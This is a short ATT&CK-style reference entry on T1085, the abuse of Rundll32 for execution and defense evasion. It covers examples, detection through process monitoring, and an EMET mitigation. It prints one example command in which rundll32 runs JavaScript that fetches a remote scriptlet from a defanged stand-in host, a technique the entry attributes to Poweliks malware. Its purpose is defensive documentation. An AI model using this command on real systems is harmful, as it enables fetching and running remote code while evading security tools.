# T1085 - Rundll32

## Attributes
**Tactics**: Defense Evasion, Execution
**Effective Permissions**: User
**Data Sources**: File monitoring, process monitoring, process command-line parameters, binary file metadata

## Description

Rundll32.exe is a program on Windows that can be called to execute arbitrary binary. Adversaries are able to take advantage of these features to execute code through Rundll32 and avoid triggering any security tools that most likely do not monitor execution of Rundll32 processes as Windows uses it for normal operations. 

## Tools to Perform Attack
Rundll32.exe

### Examples
Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions `Control_RunDLL` and `Control_RunDLLAsUser`. Double-clicking a .cpl file also causes rundll32.exe to execute.
Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: `rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"` This behavior has been seen used by malware such as Poweliks.



## Detection

Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.

## Mitigation
[](https://attack.mitre.org/mitigations/M1050)

Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.

## References

- **References to all articles go here**
  - [https://attack.mitre.org/techniques/T1085/](https://attack.mitre.org/techniques/T1085/)